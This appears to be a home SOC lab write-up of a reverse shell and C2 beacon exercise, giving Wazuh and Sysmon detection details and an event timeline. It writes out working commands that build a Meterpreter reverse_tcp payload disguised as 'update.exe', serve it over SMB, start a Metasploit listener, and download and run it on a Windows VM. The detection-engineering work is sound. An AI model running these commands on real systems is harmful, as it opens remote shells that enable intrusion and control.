# Attack 03 — Reverse Shell / C2 Beacon

## Overview

|Field|Details|
|-|-|
|MITRE ID|T1059.001|
|Tactic|Execution + Command \& Control|
|Severity|Critical|
|Tool|Metasploit / msfvenom|
|Wazuh Rule|100003 — Level 12|
|Attacker|Kali Linux (192.168.56.106)|
|Target|Windows 10 VM (192.168.56.105)|

## Objective

Generate a Meterpreter reverse shell payload, transfer it to the Windows VM, and establish a C2 session to trigger Sysmon network connection detection.

## Commands

### Kali Terminal 1 — Generate and Serve Payload

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse\_tcp \\
  LHOST=192.168.56.106 LPORT=4444 \\
  -f exe -o /tmp/update.exe

# Start SMB server
sudo impacket-smbserver share /tmp -smb2support
```

### Kali Terminal 2 — Start Listener

```bash
msfconsole -q -x "use exploit/multi/handler; \\
  set payload windows/x64/meterpreter/reverse\_tcp; \\
  set LHOST 192.168.56.106; set LPORT 4444; run"
```

### Windows VM — PowerShell as Administrator

```powershell
# Download via SMB
net use \\\\192.168.56.106\\share /user:guest ""
Copy-Item "\\\\192.168.56.106\\share\\update.exe" "C:\\SOC-Lab\\update.exe"

# Execute payload
C:\\SOC-Lab\\update.exe

# Cleanup
Remove-Item C:\\SOC-Lab\\update.exe -Force
```

## Detection

* **Rule ID:** 100003 — Level 12
* **Sysmon EID:** 1 (Process Create), 3 (Network Connection)
* **Dashboard Search:** update.exe OR 4444

## Attack Timeline

|Time|Event|
|-|-|
|T+00:00|Sysmon EID 11 — update.exe file created|
|T+00:01|Sysmon EID 1 — update.exe process spawned|
|T+00:02|Sysmon EID 3 — outbound TCP:4444 to 192.168.56.106|
|T+00:02|Rule 100003 fires — C2 beacon detected|
|T+00:03|Meterpreter session opened on Kali|



